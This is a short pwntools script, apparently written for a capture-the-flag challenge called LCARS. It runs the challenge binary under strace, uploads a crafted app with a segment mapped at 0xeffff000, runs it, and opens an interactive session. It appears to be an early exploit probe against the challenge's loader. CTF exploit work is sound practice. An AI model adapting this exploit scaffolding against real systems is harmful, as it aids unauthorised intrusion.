from pwn import *
from app import App

args = ['./LCARS', 'init.sys', 'loader.sys', 'echo.sys',
        'crypto.sys', 'root.key', 'flag22.txt',
        'flag333.txt']
args = ['strace', '-f'] + args
r = process(args)

def download(app, blob):
    r.sendline('download %s %d' % (app, len(blob)))
    r.send(blob)

a = App('failure')
base = 0x10000000
# base = 0x50000000
for i in xrange(0):
    a.add_segment(base + i * 0x1000, 5, '\xcc' * 0x1000)
a.add_segment(0xeffff000, 3, 'A' * 0x1000)
download('fail.uapp', str(a))
r.sendline('run fail.uapp')

r.interactive()
